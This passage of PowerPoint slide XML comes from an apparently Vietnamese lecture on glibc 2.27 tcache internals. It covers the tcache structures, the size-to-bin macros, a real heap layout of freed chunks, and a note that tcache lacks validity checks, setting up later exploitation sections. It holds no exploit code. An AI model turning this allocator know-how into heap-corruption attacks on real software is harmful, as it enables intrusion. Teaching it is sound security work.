          <a:xfrm>
            <a:off x="6391656" y="2331720"/>
            <a:ext cx="5157216" cy="208483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Lớp đệm riêng từng thread, nằm trước arena/bin</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="177800" indent="-177800">
              <a:spcAft>
                <a:spcPts val="500"/>
              </a:spcAft>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>free()</a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> đẩy vào cache của chính thread; </a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>malloc()</a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> rút ra trước khi chạm arena</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="177800" indent="-177800">
              <a:spcAft>
                <a:spcPts val="500"/>
              </a:spcAft>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Khai báo </a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>__thread</a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>: mỗi thread một bản sao độc lập</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Shape 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="4754880"/>
            <a:ext cx="11274552" cy="1463040"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 5000"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent2"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Text 11"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="4919472"/>
            <a:ext cx="10908792" cy="228600"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1000" b="1" spc="100" kern="0" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent2"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>HỆ QUẢ BẢO MẬT</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Text 12"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="5212080"/>
            <a:ext cx="10908792" cy="4114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Không khóa nghĩa là không có người gác cổng</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="Text 13"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="5669280"/>
            <a:ext cx="10908792" cy="438912"/>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Ngoài vài dòng trong tcache_put/tcache_get, không có kiểm tra hợp lệ nào. Toàn bộ phần 02 và 03 xoay quanh điểm này.</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tcache_perthread_struct: sổ sách của tcache</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4-c · malloc.c:2914–2921 · glibc-2.27</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Shape 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="1417320"/>
            <a:ext cx="5120640" cy="2103120"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3478"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="accent6"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent5"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Text 3"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="1554480"/>
            <a:ext cx="4754880" cy="187452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typedef struct tcache_perthread_struct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char counts[TCACHE_MAX_BINS];</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tcache_entry *entries[TCACHE_MAX_BINS];</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tcache_perthread_struct;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b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>static __thread tcache_perthread_struct *tcache;</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="11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806440" y="1417320"/>
          <a:ext cx="5925312" cy="914400"/>
        </p:xfrm>
        <a:graphic>
          <a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/table">
            <a:tbl>
              <a:tblPr/>
              <a:tblGrid>
                <a:gridCol w="1371600"/>
                <a:gridCol w="1600200"/>
                <a:gridCol w="2953512"/>
              </a:tblGrid>
              <a:tr h="0">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr indent="0" marL="0">
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1200" b="1" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Thành phần</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Kiểu</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Ý nghĩa</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r>
              <a:tr h="0">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counts[64]</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char[64]</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số chunk đang nằm trong bin idx (0–7)</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entries[64]</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tcache_entry*[64]</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chunk đầu danh sách của bin idx, hoặc NULL</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tcache</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con trỏ __thread</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mỗi thread một bản; tcache_put/get đọc ghi biến này</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bl>
          </a:graphicData>
        </a:graphic>
      </p:graphicFrame>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Shape 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="3749040"/>
            <a:ext cx="11274552" cy="2468880"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2963"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent5"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Text 5"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="3886200"/>
            <a:ext cx="10881360" cy="22860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LAYOUT BYTE THẬT · tcache_perthread_struct LÀ CHUNK HEAP ĐẦU TIÊN (VÍ DỤ 5.5: i, h)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Text 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="731520" y="4224528"/>
            <a:ext cx="4663440" cy="868680"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="accent1"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:schemeClr val="accent1"/>
            </a:solidFill>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="762" tIns="762" rIns="762" bIns="762" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr" indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1050" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>tcache_perthread_struct</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1050" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="ctr" indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1050" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>counts[14]=2 · entries[14]=0x360</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1050" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Text 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5522976" y="4224528"/>
            <a:ext cx="1828800" cy="86868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050" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>chunk i (đã free)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1050" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="ctr" indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1050" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>fd/next = NULL</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1050" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Text 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7479792" y="4224528"/>
            <a:ext cx="1828800" cy="868680"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="accent6"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:schemeClr val="accent2"/>
            </a:solidFill>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="762" tIns="762" rIns="762" bIns="762" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr" indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1050" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent2"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>chunk h (đã free)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1050" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="ctr" indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1050" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent2"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>fd/next = 0x260</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1050" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Text 9"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="731520" y="5111496"/>
            <a:ext cx="4663440" cy="201168"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr" indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="950" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg2"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>heap+0x000</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="950" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Text 10"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5522976" y="5111496"/>
            <a:ext cx="1828800" cy="201168"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr" indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="850" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg2"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>heap+0x250 · mem(i)=0x260</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="850" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Text 11"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7479792" y="5111496"/>
            <a:ext cx="1828800" cy="201168"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr" indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="850" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg2"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>heap+0x350 · mem(h)=0x360</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="850" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="Text 12"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="731520" y="5477256"/>
            <a:ext cx="1783080" cy="384048"/>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entries[14]=0x360</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="Shape 13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2542032" y="5669280"/>
            <a:ext cx="274320" cy="0"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="22225">
            <a:solidFill>
              <a:schemeClr val="accent1"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
            <a:tailEnd type="triangle"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="Text 14"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2862072" y="5458968"/>
            <a:ext cx="1005840" cy="420624"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="accent6"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:schemeClr val="accent2"/>
            </a:solidFill>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="762" tIns="762" rIns="762" bIns="762" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr" indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent2"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>h</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="18" name="Text 15"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3931920" y="5477256"/>
            <a:ext cx="1600200" cy="384048"/>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*(0x360)=0x260</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="Shape 16"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5559552" y="5669280"/>
            <a:ext cx="274320" cy="0"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="22225">
            <a:solidFill>
              <a:schemeClr val="accent1"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
            <a:tailEnd type="triangle"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="20" name="Text 17"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5879592" y="5458968"/>
            <a:ext cx="1005840" cy="420624"/>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i</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="21" name="Text 18"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6949440" y="5477256"/>
            <a:ext cx="1600200" cy="384048"/>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*(0x260)=NULL</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="22" name="Text 19"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8686800" y="5404104"/>
            <a:ext cx="2834640" cy="685800"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1050" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Khác "64 ngăn kéo" trừu tượng: entries[idx] và next ở trên là ĐỊA CHỈ HEAP THẬT, nằm ngay trong 8 byte đầu user data của từng chunk đã free.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="10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Từ kích thước chunk tới chỉ số bin</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4-d,e · malloc.c:2904–2907, 308, 311</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Shape 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="1417320"/>
            <a:ext cx="5522976" cy="1737360"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 4211"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="accent6"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent5"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Text 3"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="1554480"/>
            <a:ext cx="5157216" cy="150876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typedef struct tcache_entry</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struct tcache_entry *next;</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1150" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1150" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg2"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>  /* glibc &gt;= 2.29 thêm: key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tcache_entry;</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1150" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Shape 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="3383280"/>
            <a:ext cx="5522976" cy="1463040"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 5000"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="accent6"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent5"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Text 5"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="3520440"/>
            <a:ext cx="5157216" cy="1234440"/>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#define csize2tidx(x)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(((x) - MINSIZE + MALLOC_ALIGNMENT - 1) / MALLOC_ALIGNMENT)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#define tidx2usize(idx)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(((size_t) idx) * MALLOC_ALIGNMENT + MINSIZE - SIZE_SZ)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1050" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Shape 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="5074920"/>
            <a:ext cx="5522976" cy="1143000"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 6400"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent5"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Text 7"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="5239512"/>
            <a:ext cx="5157216" cy="868680"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:spcAft>
                <a:spcPts val="500"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1350" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
